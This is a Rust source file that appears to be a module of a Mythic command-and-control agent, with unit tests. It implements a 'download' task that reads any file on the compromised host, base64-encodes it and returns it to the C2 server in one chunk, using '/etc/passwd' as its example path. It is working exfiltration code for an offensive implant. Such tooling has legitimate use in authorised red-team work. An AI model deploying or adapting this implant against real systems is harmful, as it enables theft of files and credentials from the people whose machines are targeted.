//! File download (agent → Mythic) — single-chunk for basic usage.
//!
//! Reads the entire file into memory, base64 encodes the contents,
//! and sends it back as one chunk via the `TaskDownload` protocol.
//!
//! Task parameters (JSON):
//! ```json
//! {
//!     "path": "/etc/passwd",
//!     "host": "optional-hostname"
//! }
//! ```

use std::path::Path;

use mythic::{TaskDownload, TaskMessage, TaskResponse};
use serde::Deserialize;

// ── Params ──────────────────────────────────────────────────

#[derive(Deserialize)]
struct Params {
    path: String,
    #[serde(default)]
    host: Option<String>,
}

// ── Constants ───────────────────────────────────────────────

/// Maximum file size (bytes) for single-chunk download.
/// Files larger than this will be rejected with an error message.
const MAX_SINGLE_CHUNK: u64 = 50 * 1024 * 1024; // 50 MB

// ── Main handler ────────────────────────────────────────────

pub fn handle(task: &TaskMessage) -> TaskResponse {
    let params = match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => p,
        Err(e) => return TaskResponse::failed(task.id, &format!("download parse error: {e}")),
    };

    let path = Path::new(&params.path);

    // 1. Read file
    let data = match std::fs::read(path) {
        Ok(d) => d,
        Err(e) => return TaskResponse::failed(task.id, &format!("read {} failed: {e}", path.display())),
    };

    if data.len() as u64 > MAX_SINGLE_CHUNK {
        return TaskResponse::failed(
            task.id,
            &format!(
                "file too large ({} bytes, max {MAX_SINGLE_CHUNK} for single-chunk); multi-chunk download not yet implemented",
                data.len()
            ),
        );
    }

    // 2. Base64 encode
    use base64::Engine;
    let encoded = base64::engine::general_purpose::STANDARD.encode(&data);

    // 3. Extract filename
    let filename = path
        .file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "unknown".into());

    // 4. Build download response
    let full_path = path.to_string_lossy().to_string();

    println!(
        "[download] {} → {} bytes (base64: {})",
        full_path,
        data.len(),
        encoded.len()
    );

    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(format!("{} ({} bytes)", filename, data.len())),
        download: Some(TaskDownload {
            total_chunks: Some(1),
            chunk_size: Some(data.len() as u32),
            chunk_num: Some(1),
            chunk_data: Some(encoded),
            filename: Some(filename),
            full_path: Some(full_path),
            host: params.host,
            ..Default::default()
        }),
        ..Default::default()
    }
}

// ── Tests ───────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_download_existing_file() {
        let mut tmp = std::env::temp_dir();
        tmp.push("nanaz_dl_test.txt");
        std::fs::write(&tmp, b"hello download test").unwrap();

        let task = TaskMessage {
            command: "download".into(),
            parameters: serde_json::json!({"path": tmp.to_string_lossy()}).to_string(),
            ..Default::default()
        };
        let resp = handle(&task);
        let _ = std::fs::remove_file(&tmp);

        assert!(resp.completed == Some(true));
        assert!(resp.download.is_some());
        let dl = resp.download.unwrap();
        assert_eq!(dl.total_chunks, Some(1));
        assert_eq!(dl.chunk_num, Some(1));
        assert!(dl.chunk_data.is_some());
    }

    #[test]
    fn test_download_nonexistent() {
        let task = TaskMessage {
            command: "download".into(),
            parameters: r#"{"path": "/no/such/file.xyz"}"#.into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("error"));
    }
}
